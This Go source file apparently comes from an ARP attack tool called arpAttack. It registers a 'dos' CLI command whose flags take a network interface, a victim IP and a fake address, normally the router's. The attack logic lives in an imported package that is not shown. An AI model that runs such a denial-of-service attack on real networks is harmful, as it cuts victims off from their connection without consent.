package cmd

import (
	"log"

	"github.com/rogercoll/arpAttack/pkg/dos"
	"github.com/spf13/cobra"
)

type dosFlags struct {
	Iface    string
	Victim   string
	FakeAddr string
}

var myDosFlags dosFlags

// evenCmd represents the even command
var dosCmd = &cobra.Command{
	Use:   "dos",
	Short: "Perform DoS attack",
	Long:  `Perform DoS attack`,
	Run: func(cmd *cobra.Command, args []string) {
		err := dos.Run(myDosFlags.Iface, myDosFlags.Victim, myDosFlags.FakeAddr)
		if err != nil {
			log.Fatal(err)
		}
	},
}

func init() {
	rootCmd.AddCommand(dosCmd)
	dosCmd.PersistentFlags().StringVar(&myDosFlags.Iface, "i", "wlp58s0", "Interface to perform the attack, helper: ifconfig")
	dosCmd.PersistentFlags().StringVar(&myDosFlags.Victim, "victim", "192.168.1.69", "Victim private IP address")
	dosCmd.PersistentFlags().StringVar(&myDosFlags.FakeAddr, "fakeAddr", "192.168.1.1", "Normally to perform a DoS attack this address should be the router address")

}
